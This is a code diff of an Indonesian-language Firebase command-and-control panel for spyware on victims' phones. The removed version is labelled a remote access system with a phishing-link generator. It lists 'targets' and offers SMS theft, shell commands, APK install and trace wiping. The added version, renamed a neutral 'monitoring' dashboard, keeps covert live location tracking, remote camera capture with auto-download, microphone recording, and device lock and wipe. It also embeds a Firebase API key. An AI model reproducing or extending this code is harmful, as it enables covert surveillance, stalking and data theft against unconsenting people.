@@ -3,164 +3,326 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel Admin - Remote Control</title>
+    <title>Dashboard - Monitoring System</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
+        :root {
+            --bg: #0d1117;
+            --card: #161b22;
+            --border: #30363d;
+            --text: #c9d1d9;
+            --accent: #58a6ff;
+            --green: #3fb950;
+            --red: #f85149;
+            --yellow: #d2991d;
+            --orange: #ff8c00;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        h1 { text-align: center; color: #ff0000; margin-bottom: 30px; text-shadow: 0 0 10px #ff0000; }
-        .panel { display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
-        .user-list { background: #111; border: 1px solid #00ff00; padding: 15px; border-radius: 5px; max-height: 600px; overflow-y: auto; }
-        .user-list h3 { color: #ffff00; margin-bottom: 15px; }
-        .user-item { padding: 10px; margin: 5px 0; background: #1a1a1a; cursor: pointer; border: 1px solid #333; border-radius: 3px; transition: all 0.3s; }
-        .user-item:hover { background: #2a2a2a; border-color: #00ff00; }
-        .user-item.active { background: #003300; border-color: #00ff00; }
-        .user-item .status { font-size: 10px; color: #888; }
-        .user-item .online { color: #00ff00; }
-        .detail-panel { background: #111; border: 1px solid #00ff00; padding: 20px; border-radius: 5px; }
-        .section { margin-bottom: 20px; padding: 15px; background: #1a1a1a; border: 1px solid #333; border-radius: 3px; }
-        .section h3 { color: #ffff00; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
-        button { background: #003300; color: #00ff00; border: 1px solid #00ff00; padding: 8px 15px; margin: 3px; cursor: pointer; font-family: 'Courier New', monospace; border-radius: 3px; transition: all 0.3s; }
-        button:hover { background: #006600; }
-        button.danger { background: #330000; color: #ff0000; border-color: #ff0000; }
-        button.danger:hover { background: #660000; }
-        input, textarea { width: 100%; background: #000; color: #00ff00; border: 1px solid #333; padding: 10px; margin: 5px 0; font-family: 'Courier New', monospace; border-radius: 3px; }
-        input:focus, textarea:focus { outline: none; border-color: #00ff00; }
-        .map-container { width: 100%; height: 400px; background: #000; border: 1px solid #333; margin: 10px 0; }
-        .log-area { max-height: 200px; overflow-y: auto; background: #000; padding: 10px; font-size: 11px; margin: 10px 0; }
-        .device-info { font-size: 12px; color: #888; }
-        .cam-preview { max-width: 100%; max-height: 300px; margin: 10px 0; display: none; }
-        .mic-status { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #ff0000; margin-right: 5px; }
-        .mic-status.recording { background: #00ff00; animation: blink 0.5s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        .file-item { padding: 5px; border-bottom: 1px solid #222; cursor: pointer; }
-        .file-item:hover { background: #1a1a1a; }
-        .sms-item { padding: 5px; border-bottom: 1px solid #222; font-size: 12px; }
-        .tabs { display: flex; gap: 5px; margin-bottom: 15px; }
-        .tab { padding: 10px 20px; background: #1a1a1a; border: 1px solid #333; cursor: pointer; }
-        .tab.active { background: #003300; border-color: #00ff00; }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .app { display: flex; height: 100vh; }
+        
+        .sidebar {
+            width: 320px;
+            background: var(--card);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .sidebar-header {
+            padding: 16px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .logo { font-size: 20px; font-weight: 700; color: #fff; }
+        .badge { background: var(--green); color: #000; font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: 600; }
+        .search-box { padding: 12px 16px; border-bottom: 1px solid var(--border); }
+        .search-box input {
+            width: 100%;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+        }
+        .search-box input:focus { outline: none; border-color: var(--accent); }
+        .device-list { flex: 1; overflow-y: auto; padding: 8px; }
+        .device-card {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+        }
+        .device-card:hover { border-color: var(--accent); }
+        .device-card.selected { border-color: var(--accent); background: #1a2332; }
+        .device-card .name { font-weight: 600; color: #fff; font-size: 15px; }
+        .device-card .meta { font-size: 12px; color: #8b949e; margin-top: 4px; }
+        .device-card .dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            position: absolute;
+            top: 12px; right: 12px;
+        }
+        .dot.online { background: var(--green); box-shadow: 0 0 8px var(--green); }
+        .dot.offline { background: var(--red); }
+        .device-card .error-indicator {
+            position: absolute;
+            top: 12px; right: 28px;
+            color: var(--orange);
+            font-size: 12px;
+            display: none;
+        }
+        
+        .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+        .topbar {
+            padding: 12px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--card);
+        }
+        .topbar h2 { font-size: 18px; font-weight: 600; color: #fff; }
+        .btn {
+            padding: 6px 14px;
+            border: 1px solid var(--border);
+            background: var(--bg);
+            color: var(--text);
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        .btn:hover { border-color: var(--accent); color: #fff; }
+        .btn.primary { background: #238636; border-color: #238636; color: #fff; }
+        .btn.primary:hover { background: #2ea043; }
+        .btn.danger { background: #da3633; border-color: #da3633; color: #fff; }
+        .btn.danger:hover { background: #f85149; }
+        .btn.warn { background: #9a6700; border-color: #d2991d; color: #fff; }
+        .btn.small { padding: 3px 10px; font-size: 11px; }
+        
+        .content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+        }
+        .card.full { grid-column: 1 / -1; }
+        .card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid var(--border);
+        }
+        .card-header h3 { font-size: 14px; font-weight: 600; color: #fff; }
+        
+        #map { height: 280px; border-radius: 6px; border: 1px solid var(--border); }
+        .info-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 6px; }
+        .info-tag {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+        .info-tag span { color: #8b949e; }
+        .info-tag strong { color: #fff; }
+        
+        .camera-area {
+            text-align: center;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #000;
+            border-radius: 6px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+            position: relative;
+        }
+        .camera-area img, .camera-area video {
+            max-width: 100%;
+            max-height: 260px;
+            border-radius: 6px;
+        }
+        
+        .log-box {
+            background: #000;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 10px;
+            height: 180px;
+            overflow-y: auto;
+            font-size: 12px;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            color: #7ee787;
+        }
+        .log-box .entry { margin-bottom: 3px; }
+        .log-box .time { color: #8b949e; }
+        .log-box .warn { color: var(--orange); }
+        .log-box .error { color: var(--red); }
+        
+        .notif-toast {
+            position: fixed;
+            bottom: 20px; right: 20px;
+            padding: 12px 20px;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 600;
+            z-index: 9999;
+            animation: slideIn 0.3s ease;
+            max-width: 380px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        .notif-toast.success { background: #238636; border: 1px solid #3fb950; }
+        .notif-toast.error { background: #da3633; border: 1px solid #f85149; }
+        .notif-toast.warning { background: #9a6700; border: 1px solid #d2991d; }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .cmd-row { display: flex; gap: 6px; margin-bottom: 8px; flex-wrap: wrap; }
+        .cmd-row input {
+            flex: 1;
+            min-width: 100px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 6px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+        .cmd-row input:focus { outline: none; border-color: var(--accent); }
+        
+        .empty-state { text-align: center; padding: 60px 20px; color: #8b949e; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>⚡ PANEL ADMIN - REMOTE ACCESS SYSTEM ⚡</h1>
-        <div class="tabs">
-            <div class="tab active" onclick="switchTab('users')">👥 Target Aktif</div>
-            <div class="tab" onclick="switchTab('logs')">📋 Logs</div>
-            <div class="tab" onclick="switchTab('phishing')">🎣 Link Phishing</div>
-        </div>
-        <div class="panel" id="tab-users">
-            <div class="user-list" id="userList">
-                <h3>🎯 Target Terhubung</h3>
-                <div id="users"></div>
+    <div class="app">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <span class="logo">📡 Dashboard</span>
+                <span class="badge" id="onlineCount">0 online</span>
             </div>
-            <div class="detail-panel" id="detailPanel">
-                <h3>Pilih target untuk melihat detail</h3>
-                <div id="targetDetail" style="display:none;">
-                    <div class="section">
-                        <h3>📱 Info Perangkat</h3>
-                        <div id="deviceInfo" class="device-info"></div>
-                        <div id="locationInfo"></div>
-                    </div>
-                    <div class="section">
-                        <h3>📍 Lacak Lokasi (Real-time)</h3>
-                        <div class="map-container" id="map"></div>
-                        <button onclick="refreshLocation()">🔄 Refresh Lokasi</button>
-                        <button onclick="startLiveTracking()">🔴 Live Tracking</button>
-                        <button onclick="stopLiveTracking()">⏹️ Stop Tracking</button>
-                        <div id="locationHistory" class="log-area"></div>
-                    </div>
-                    <div class="section">
-                        <h3>📸 Kamera</h3>
-                        <img id="camPreview" class="cam-preview" />
-                        <button onclick="capturePhoto()">📷 Ambil Foto (Depan)</button>
-                        <button onclick="captureRearPhoto()">📷 Ambil Foto (Belakang)</button>
-                        <button onclick="startVideoStream()">🎥 Mulai Streaming</button>
-                        <button onclick="stopVideoStream()">⏹️ Stop Streaming</button>
-                    </div>
-                    <div class="section">
-                        <h3>🎤 Mikrofon</h3>
-                        <span class="mic-status" id="micStatus"></span> Status Mikrofon
-                        <button onclick="startMic()">🎙️ Mulai Rekam</button>
-                        <button onclick="stopMic()">⏹️ Stop Rekam</button>
-                        <button onclick="downloadAudio()">💾 Unduh Audio</button>
-                        <div id="micLogs" class="log-area"></div>
-                    </div>
-                    <div class="section">
-                        <h3>📁 File Manager</h3>
-                        <input type="text" id="filePath" placeholder="/sdcard/" />
-                        <button onclick="browseFiles()">📂 Buka</button>
-                        <button onclick="downloadFile()">⬇️ Unduh File</button>
-                        <button onclick="uploadFile()">⬆️ Upload File</button>
-                        <div id="fileList"></div>
-                    </div>
-                    <div class="section">
-                        <h3>📨 SMS</h3>
-                        <button onclick="readSMS()">📩 Baca SMS</button>
-                        <button onclick="sendSMS()">✉️ Kirim SMS</button>
-                        <input type="text" id="smsNumber" placeholder="Nomor tujuan" />
-                        <textarea id="smsMessage" placeholder="Pesan..." rows="2"></textarea>
-                        <div id="smsList"></div>
-                    </div>
-                    <div class="section">
-                        <h3>📞 Kontak</h3>
-                        <button onclick="getContacts()">👤 Ambil Kontak</button>
-                        <div id="contactList"></div>
-                    </div>
-                    <div class="section">
-                        <h3>🔔 Notifikasi</h3>
-                        <input type="text" id="notifTitle" placeholder="Judul" />
-                        <textarea id="notifBody" placeholder="Isi..." rows="2"></textarea>
-                        <button onclick="sendNotification()">📢 Kirim Notifikasi</button>
-                    </div>
-                    <div class="section">
-                        <h3>🌐 Shell Command</h3>
-                        <textarea id="shellCommand" placeholder="Masukkan perintah..." rows="2"></textarea>
-                        <button onclick="executeShell()">▶️ Jalankan</button>
-                        <pre id="shellOutput" class="log-area"></pre>
-                    </div>
-                    <div class="section">
-                        <h3>📊 Data Aplikasi</h3>
-                        <button onclick="getInstalledApps()">📱 Aplikasi Terpasang</button>
-                        <button onclick="getClipboard()">📋 Clipboard</button>
-                        <button onclick="getCallLogs()">📞 Riwayat Panggilan</button>
-                        <button onclick="getWifiNetworks()">📶 Jaringan WiFi</button>
-                        <div id="extraData" class="log-area"></div>
-                    </div>
-                    <div class="section">
-                        <h3>⚙️ Kontrol Jarak Jauh</h3>
-                        <button onclick="lockDevice()">🔒 Kunci Perangkat</button>
-                        <button onclick="vibrateDevice()">📳 Getarkan</button>
-                        <button onclick="openURL()">🌐 Buka URL</button>
-                        <input type="text" id="urlInput" placeholder="https://..." />
-                        <button onclick="installAPK()">📦 Install APK</button>
-                        <input type="text" id="apkUrl" placeholder="URL APK..." />
-                        <button class="danger" onclick="wipeDevice()">💀 WIPE DEVICE</button>
-                        <button class="danger" onclick="uninstallApp()">🗑️ Hapus Jejak</button>
-                    </div>
+            <div class="search-box">
+                <input type="text" placeholder="Cari device..." id="searchInput" oninput="filterDevices()" />
+            </div>
+            <div class="device-list" id="deviceList">
+                <div class="empty-state"><p>Belum ada device</p></div>
+            </div>
+        </div>
+        
+        <div class="main">
+            <div class="topbar">
+                <h2 id="panelTitle">Pilih device</h2>
+                <div class="actions">
+                    <button class="btn" onclick="showLinkModal()">🔗 Link</button>
+                    <button class="btn primary" onclick="refreshAll()">🔄 Refresh</button>
                 </div>
             </div>
-        </div>
-        <div id="tab-logs" style="display:none;">
-            <div class="section">
-                <h3>📋 Logs Sistem</h3>
-                <div id="systemLogs" class="log-area" style="height:500px;"></div>
+            <div class="content" id="detailContent" style="display:none;">
+                <div class="card">
+                    <div class="card-header">
+                        <h3>📱 Info</h3>
+                        <button class="btn small" onclick="requestUpdate()">Update</button>
+                    </div>
+                    <div id="deviceInfo"></div>
+                </div>
+                <div class="card">
+                    <div class="card-header">
+                        <h3>📍 Lokasi</h3>
+                        <div>
+                            <button class="btn small primary" id="trackBtn" onclick="toggleTracking()">▶ Track</button>
+                            <button class="btn small" onclick="refreshLocation()">Refresh</button>
+                        </div>
+                    </div>
+                    <div id="map"></div>
+                    <div id="locText" style="font-size:12px;margin-top:6px;">-</div>
+                </div>
+                <div class="card">
+                    <div class="card-header">
+                        <h3>📸 Kamera</h3>
+                        <div>
+                            <button class="btn small" onclick="capturePhoto('user')">Selfie</button>
+                            <button class="btn small" onclick="capturePhoto('environment')">Belakang</button>
+                            <button class="btn small primary" onclick="toggleVideoStream()">Stream</button>
+                        </div>
+                    </div>
+                    <div class="camera-area" id="cameraArea">
+                        <span style="color:#8b949e;">Klik tombol ambil gambar</span>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-header">
+                        <h3>🎤 Audio</h3>
+                        <div>
+                            <button class="btn small" id="micBtn" onclick="toggleMic()">▶ Rekam</button>
+                            <button class="btn small" onclick="downloadAudio()">Unduh</button>
+                        </div>
+                    </div>
+                    <div id="micStatus" style="font-size:12px;margin-bottom:6px;">Mikrofon idle</div>
+                    <div class="log-box" id="audioLog">Menunggu...</div>
+                </div>
+                <div class="card full">
+                    <div class="card-header"><h3>⚡ Actions</h3></div>
+                    <div class="cmd-row">
+                        <button class="btn small" onclick="sendNotif()">Notifikasi</button>
+                        <input type="text" id="notifTitle" placeholder="Judul" style="max-width:130px;" />
+                        <input type="text" id="notifBody" placeholder="Pesan" style="max-width:200px;" />
+                    </div>
+                    <div class="cmd-row">
+                        <button class="btn small" onclick="openUrl()">Buka URL</button>
+                        <input type="text" id="urlInput" placeholder="https://..." />
+                    </div>
+                    <div class="cmd-row" style="border-top:1px solid var(--border);padding-top:8px;">
+                        <button class="btn small danger" onclick="lockScreen()">Kunci</button>
+                        <button class="btn small" onclick="vibratePhone()">Getar</button>
+                        <button class="btn small danger" onclick="wipeConfirm()">Hapus Data</button>
+                    </div>
+                </div>
+                <div class="card full">
+                    <div class="card-header"><h3>📋 Log & Error</h3></div>
+                    <div class="log-box" id="activityLog"></div>
+                    <div id="errorAlerts" style="margin-top:8px;"></div>
+                </div>
             </div>
-        </div>
-        <div id="tab-phishing" style="display:none;">
-            <div class="section">
-                <h3>🎣 Generator Link Phishing</h3>
-                <p>Target cukup masukkan nama, otomatis terhubung ke panel.</p>
-                <button onclick="generatePhishingLink()">🔗 Buat Link</button>
-                <input type="text" id="phishingLink" readonly placeholder="Link akan muncul di sini..." />
-                <button onclick="copyPhishingLink()">📋 Salin Link</button>
-                <p style="color:#ff0000;margin-top:10px;">Link index.html: <span id="targetLink"></span></p>
+            <div class="empty-state" id="emptyMain" style="margin-top:80px;">
+                <p>👈 Pilih device dari sidebar</p>
             </div>
         </div>
     </div>
-
+    
+    <!-- Toast container -->
+    <div id="toastContainer"></div>
+    
     <script>
         firebase.initializeApp({
             apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
@@ -176,304 +338,378 @@
         let currentTarget = null;
         let map = null;
         let marker = null;
-        let liveTrackingInterval = null;
+        let trackingActive = false;
+        let allDevices = {};
         
-        const targetLink = window.location.href.replace('admin.html', 'index.html');
-        document.getElementById('targetLink').textContent = targetLink;
+        function toast(msg, type = 'success') {
+            const container = document.getElementById('toastContainer');
+            const el = document.createElement('div');
+            el.className = `notif-toast ${type}`;
+            el.textContent = msg;
+            container.appendChild(el);
+            setTimeout(() => { el.remove(); }, 4000);
+        }
+        
+        function addLog(msg, type = '') {
+            const el = document.getElementById('activityLog');
+            const time = new Date().toLocaleTimeString();
+            el.innerHTML += `<div class="entry ${type}"><span class="time">[${time}]</span> ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
+        }
+        
+        function loadDevices() {
+            db.ref('targets').on('value', (snap) => {
+                allDevices = snap.val() || {};
+                renderDeviceList();
+                updateOnlineCount();
+                checkAllErrors();
+            });
+        }
+        
+        function checkAllErrors() {
+            Object.entries(allDevices).forEach(([id, d]) => {
+                if (d.locationError) {
+                    toast(`⚠️ ${d.name}: ${d.locationError}`, 'warning');
+                }
+                if (d.photoError) {
+                    toast(`⚠️ ${d.name}: Kamera error - ${d.photoError.message}`, 'error');
+                }
+                if (d.videoError) {
+                    toast(`⚠️ ${d.name}: Stream error - ${d.videoError.message}`, 'error');
+                }
+                if (d.micError) {
+                    toast(`⚠️ ${d.name}: Mic error - ${d.micError.message}`, 'error');
+                }
+            });
+        }
+        
+        function renderDeviceList(filter = '') {
+            const container = document.getElementById('deviceList');
+            const devices = Object.entries(allDevices);
+            const filtered = devices.filter(([id, d]) => 
+                !filter || (d.name || '').toLowerCase().includes(filter.toLowerCase())
+            );
+            
+            if (filtered.length === 0) {
+                container.innerHTML = `<div class="empty-state"><p>Tidak ada device</p></div>`;
+                return;
+            }
+            
+            container.innerHTML = filtered.map(([id, d]) => {
+                const hasError = d.locationError || d.photoError || d.videoError || d.micError;
+                return `
+                <div class="device-card ${currentTarget === id ? 'selected' : ''}" onclick="selectDevice('${id}')">
+                    <div class="dot ${d.online ? 'online' : 'offline'}"></div>
+                    <span class="error-indicator" style="display:${hasError ? 'inline' : 'none'}">⚠️</span>
+                    <div class="name">${d.name || 'Unknown'}</div>
+                    <div class="meta">
+                        <span>📱 ${d.deviceModel || 'N/A'}</span>
+                        <span>🌐 ${d.ip || '-'}</span>
+                    </div>
+                    <div class="meta">
+                        <span>🕐 ${d.lastSeen || '-'}</span>
+                        <span>🔋 ${d.battery || '?'}%</span>
+                    </div>
+                </div>
+                `;
+            }).join('');
+        }
+        
+        function filterDevices() {
+            renderDeviceList(document.getElementById('searchInput').value);
+        }
+        
+        function updateOnlineCount() {
+            const online = Object.values(allDevices).filter(d => d.online).length;
+            document.getElementById('onlineCount').textContent = `${online} online`;
+        }
+        
+        function selectDevice(id) {
+            currentTarget = id;
+            const d = allDevices[id];
+            if (!d) return;
+            
+            document.getElementById('detailContent').style.display = 'grid';
+            document.getElementById('emptyMain').style.display = 'none';
+            document.getElementById('panelTitle').textContent = d.name || 'Device';
+            
+            document.getElementById('deviceInfo').innerHTML = `
+                <div class="info-row">
+                    <span class="info-tag"><span>Model</span> <strong>${d.deviceModel || 'N/A'}</strong></span>
+                    <span class="info-tag"><span>OS</span> <strong>${d.deviceOS || 'N/A'}</strong></span>
+                    <span class="info-tag"><span>IP</span> <strong>${d.ip || 'N/A'}</strong></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-tag"><span>Baterai</span> <strong>${d.battery || '?'}%</strong></span>
+                    <span class="info-tag"><span>Jaringan</span> <strong>${d.network || 'N/A'}</strong></span>
+                </div>
+                <div class="info-row" style="margin-top:8px;">
+                    <span class="info-tag">📍 <strong>${d.permissions?.location ? '✅' : '❌'}</strong></span>
+                    <span class="info-tag">📸 <strong>${d.permissions?.camera ? '✅' : '❌'}</strong></span>
+                    <span class="info-tag">🎤 <strong>${d.permissions?.microphone ? '✅' : '❌'}</strong></span>
+                </div>
+            `;
+            
+            if (d.location && d.location.lat) {
+                initMap(d.location.lat, d.location.lon);
+                document.getElementById('locText').textContent = 
+                    `Lat: ${d.location.lat.toFixed(6)}, Lon: ${d.location.lon.toFixed(6)} · ±${d.location.accuracy || '?'}m`;
+            }
+            
+            document.getElementById('cameraArea').innerHTML = '<span style="color:#8b949e;">Klik tombol ambil gambar</span>';
+            document.getElementById('audioLog').innerHTML = 'Menunggu...';
+            
+            renderDeviceList();
+            addLog(`Membuka: ${d.name}`);
+            listenPhoto(id);
+            listenAudio(id);
+            listenErrors(id);
+        }
         
         function initMap(lat, lon) {
             if (!map) {
                 map = L.map('map').setView([lat, lon], 16);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    attribution: '© OpenStreetMap'
+                    attribution: '© OSM'
                 }).addTo(map);
             }
             if (marker) map.removeLayer(marker);
-            marker = L.marker([lat, lon]).addTo(map).bindPopup(`Lokasi Target<br>${new Date().toLocaleString()}`).openPopup();
+            marker = L.marker([lat, lon]).addTo(map)
+                .bindPopup('📍 Lokasi').openPopup();
             map.setView([lat, lon], 16);
         }
         
-        function loadUsers() {
-            db.ref('targets').on('value', (snapshot) => {
-                const usersDiv = document.getElementById('users');
-                usersDiv.innerHTML = '';
-                const data = snapshot.val();
-                if (data) {
-                    Object.keys(data).forEach(key => {
-                        const user = data[key];
-                        const statusClass = user.online ? 'online' : '';
-                        const div = document.createElement('div');
-                        div.className = 'user-item';
-                        div.innerHTML = `
-                            <strong>${user.name || 'Unknown'}</strong><br>
-                            <span class="status ${statusClass}">● ${user.online ? 'Online' : 'Offline'}</span>
-                            <br><small>${user.deviceInfo || 'No info'}</small>
-                            <br><small>IP: ${user.ip || 'N/A'}</small>
-                        `;
-                        div.onclick = () => selectTarget(key, user);
-                        usersDiv.appendChild(div);
-                    });
-                }
-            });
-        }
-        
-        function selectTarget(id, user) {
-            currentTarget = id;
-            document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
-            event.target.closest('.user-item').classList.add('active');
-            document.getElementById('targetDetail').style.display = 'block';
-            document.getElementById('deviceInfo').innerHTML = `
-                <p>🆔 ID: ${id}</p>
-                <p>📱 Perangkat: ${user.deviceInfo || 'N/A'}</p>
-                <p>🌐 IP: ${user.ip || 'N/A'}</p>
-                <p>📡 Provider: ${user.network || 'N/A'}</p>
-                <p>🔋 Baterai: ${user.battery || 'N/A'}%</p>
-                <p>🕐 Terakhir Online: ${user.lastSeen || 'N/A'}</p>
-            `;
-            if (user.location && user.location.lat) {
-                initMap(user.location.lat, user.location.lon);
-            }
-            loadLocationHistory(id);
-        }
-        
         function refreshLocation() {
-            if (!currentTarget) return alert('Pilih target dulu!');
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'getLocation',
-                timestamp: Date.now()
-            });
+            if (!currentTarget) return;
+            sendCmd('getLocation');
+            addLog('Request lokasi...');
         }
         
-        function startLiveTracking() {
+        function toggleTracking() {
+            const btn = document.getElementById('trackBtn');
+            if (trackingActive) {
+                trackingActive = false;
+                btn.textContent = '▶ Track';
+                addLog('Tracking stop');
+            } else {
+                trackingActive = true;
+                btn.textContent = '⏹ Stop';
+                addLog('Tracking aktif (3s)');
+                doTrack();
+            }
+        }
+        function doTrack() {
+            if (!trackingActive || !currentTarget) return;
+            sendCmd('getLocation');
+            setTimeout(doTrack, 3000);
+        }
+        
+        function capturePhoto(facingMode) {
             if (!currentTarget) return;
-            if (liveTrackingInterval) clearInterval(liveTrackingInterval);
-            liveTrackingInterval = setInterval(refreshLocation, 5000);
-            db.ref(`targets/${currentTarget}/location`).on('value', (snapshot) => {
-                const loc = snapshot.val();
-                if (loc && loc.lat) {
-                    initMap(loc.lat, loc.lon);
-                    document.getElementById('locationInfo').innerHTML = `
-                        📍 Lat: ${loc.lat}<br>📍 Lon: ${loc.lon}<br>
-                        🎯 Akurasi: ${loc.accuracy || 'N/A'}m<br>
-                        🕐 ${new Date(loc.timestamp).toLocaleString()}
-                    `;
+            sendCmd('capturePhoto', { facingMode });
+            document.getElementById('cameraArea').innerHTML = '<span style="color:#ffaa00;">📸 Mengambil foto...</span>';
+            addLog(`Ambil foto (${facingMode})...`);
+        }
+        
+        function listenPhoto(id) {
+            db.ref(`targets/${id}/photo`).off();
+            db.ref(`targets/${id}/photo`).on('value', (snap) => {
+                const data = snap.val();
+                if (data && data.base64) {
+                    document.getElementById('cameraArea').innerHTML = 
+                        `<img src="${data.base64}" alt="Foto" style="max-width:100%;max-height:260px;border-radius:6px;" />`;
+                    addLog('📸 Foto diterima!');
+                    toast('✅ Foto berhasil diambil!', 'success');
+                    
+                    // AUTO DOWNLOAD FOTO
+                    autoDownloadPhoto(data.base64, id, data.timestamp);
+                }
+            });
+            
+            // Listen error
+            db.ref(`targets/${id}/photoError`).off();
+            db.ref(`targets/${id}/photoError`).on('value', (snap) => {
+                const err = snap.val();
+                if (err) {
+                    addLog(`❌ Foto error: ${err.message}`, 'error');
+                    toast(`⚠️ Foto gagal: ${err.message}`, 'error');
                 }
             });
         }
         
-        function stopLiveTracking() {
-            if (liveTrackingInterval) clearInterval(liveTrackingInterval);
+        function autoDownloadPhoto(base64, id, timestamp) {
+            try {
+                const link = document.createElement('a');
+                link.href = base64;
+                link.download = `photo_${id}_${timestamp || Date.now()}.jpg`;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                addLog('💾 Foto otomatis terdownload');
+            } catch(e) {
+                addLog(`⚠️ Gagal download: ${e.message}`, 'warn');
+            }
         }
         
-        function loadLocationHistory(id) {
-            db.ref(`targets/${id}/locationHistory`).limitToLast(50).on('value', (snapshot) => {
-                const history = snapshot.val();
-                const div = document.getElementById('locationHistory');
-                div.innerHTML = '';
-                if (history) {
-                    Object.values(history).reverse().forEach(loc => {
-                        div.innerHTML += `📍 ${loc.lat},${loc.lon} - ${new Date(loc.timestamp).toLocaleString()}<br>`;
-                    });
+        function listenAudio(id) {
+            db.ref(`targets/${id}/audioRecording`).off();
+            db.ref(`targets/${id}/audioRecording`).on('value', (snap) => {
+                const data = snap.val();
+                if (data && data.base64) {
+                    document.getElementById('audioLog').innerHTML = '✅ Rekaman audio tersedia!';
+                    toast('🎤 Rekaman audio siap!', 'success');
+                }
+            });
+            
+            db.ref(`targets/${id}/micError`).off();
+            db.ref(`targets/${id}/micError`).on('value', (snap) => {
+                const err = snap.val();
+                if (err) {
+                    addLog(`❌ Mic error: ${err.message}`, 'error');
+                    toast(`⚠️ Mic error: ${err.message}`, 'error');
                 }
             });
         }
         
-        function capturePhoto() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'capturePhoto',
-                camera: 'front',
-                timestamp: Date.now()
+        function listenErrors(id) {
+            db.ref(`targets/${id}/locationError`).on('value', (snap) => {
+                const err = snap.val();
+                if (err) {
+                    addLog(`⚠️ GPS Error: ${err}`, 'warn');
+                    toast(`⚠️ ${allDevices[id]?.name}: GPS Error!`, 'warning');
+                }
+            });
+            
+            db.ref(`targets/${id}/videoError`).on('value', (snap) => {
+                const err = snap.val();
+                if (err) {
+                    addLog(`❌ Stream error: ${err.message}`, 'error');
+                    toast(`⚠️ Stream error: ${err.message}`, 'error');
+                }
             });
         }
         
-        function captureRearPhoto() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'capturePhoto',
-                camera: 'rear',
-                timestamp: Date.now()
-            });
-        }
-        
-        function startVideoStream() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'startVideo',
-                timestamp: Date.now()
-            });
-        }
-        
-        function stopVideoStream() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'stopVideo', timestamp: Date.now() });
-        }
-        
-        function startMic() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'startMic', timestamp: Date.now() });
-            document.getElementById('micStatus').classList.add('recording');
-        }
-        
-        function stopMic() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'stopMic', timestamp: Date.now() });
-            document.getElementById('micStatus').classList.remove('recording');
-        }
-        
-        function downloadAudio() { /* Implementasi download dari Firebase Storage */ }
-        
